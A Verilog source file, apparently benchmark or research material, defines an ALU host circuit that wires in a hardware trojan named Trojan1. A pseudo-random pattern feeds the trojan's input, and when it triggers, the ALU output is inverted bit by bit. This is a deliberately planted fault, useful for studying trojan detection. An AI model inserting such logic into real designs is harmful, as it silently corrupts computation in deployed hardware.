// ALU Host Circuit for Trojan1
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_alu_host #(
    parameter DATA_WIDTH = 16,    // ALU operand width
    parameter [15:0] R1_PATTERN = 16'hB00B  // Pattern for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] operand_a,
    input wire [DATA_WIDTH-1:0] operand_b,
    input wire [3:0] alu_op,
    input wire alu_enable,
    output reg [DATA_WIDTH-1:0] alu_result,
    output reg [DATA_WIDTH-1:0] alu_flags,  // flags: [overflow, carry, zero, negative]
    output reg result_valid
);

    // Trojan interface (fixed width)
    wire trojan_r1;
    wire trojan_trigger;
    
    // ALU internal signals
    reg [DATA_WIDTH:0] temp_result;  // Extra bit for carry/overflow
    reg [15:0] pattern_shift;
    reg [3:0] pattern_counter;
    
    // R1 signal generation using shifting pattern
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            pattern_shift <= R1_PATTERN;
            pattern_counter <= 4'b0;
        end else if (alu_enable) begin
            pattern_counter <= pattern_counter + 1;
            if (pattern_counter == 4'hF) begin
                pattern_shift <= {pattern_shift[14:0], pattern_shift[15] ^ pattern_shift[12] ^ pattern_shift[3] ^ pattern_shift[1]};
            end
        end
    end
    
    assign trojan_r1 = pattern_shift[pattern_counter];
    
    // ALU operation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            temp_result <= {DATA_WIDTH+1{1'b0}};
            result_valid <= 1'b0;
        end else if (alu_enable) begin
            case (alu_op)
                4'b0000: temp_result <= {1'b0, operand_a} + {1'b0, operand_b};           // ADD
                4'b0001: temp_result <= {1'b0, operand_a} - {1'b0, operand_b};           // SUB  
                4'b0010: temp_result <= {1'b0, operand_a} & {1'b0, operand_b};           // AND
                4'b0011: temp_result <= {1'b0, operand_a} | {1'b0, operand_b};           // OR
                4'b0100: temp_result <= {1'b0, operand_a} ^ {1'b0, operand_b};           // XOR
                4'b0101: temp_result <= {1'b0, ~operand_a};                              // NOT
                4'b0110: temp_result <= {1'b0, operand_a} << 1;                         // SHL
                4'b0111: temp_result <= {1'b0, operand_a} >> 1;                         // SHR
                4'b1000: temp_result <= (operand_a < operand_b) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}}; // SLT
                4'b1001: temp_result <= (operand_a == operand_b) ? {{DATA_WIDTH{1'b0}}, 1'b1} : {DATA_WIDTH+1{1'b0}};// SEQ
                4'b1010: temp_result <= {1'b0, operand_a} * {{(DATA_WIDTH-7){1'b0}}, operand_b[7:0]};     // MUL (partial)
                default: temp_result <= {DATA_WIDTH+1{1'b0}};
            endcase
            result_valid <= 1'b1;
        end else begin
            result_valid <= 1'b0;
        end
    end
    
    // Result and flags with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            alu_result <= {DATA_WIDTH{1'b0}};
            alu_flags <= {DATA_WIDTH{1'b0}};
        end else if (result_valid) begin
            // Mix result with trojan trigger
            alu_result <= temp_result[DATA_WIDTH-1:0] ^ (trojan_trigger ? {DATA_WIDTH{1'b1}} : {DATA_WIDTH{1'b0}});
            
            // Generate flags
            alu_flags[0] <= temp_result[DATA_WIDTH-1];                    // Negative
            alu_flags[1] <= (temp_result[DATA_WIDTH-1:0] == {DATA_WIDTH{1'b0}}); // Zero
            alu_flags[2] <= temp_result[DATA_WIDTH];                      // Carry/Overflow
            alu_flags[3] <= temp_result[DATA_WIDTH];                      // Overflow
        end
    end
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

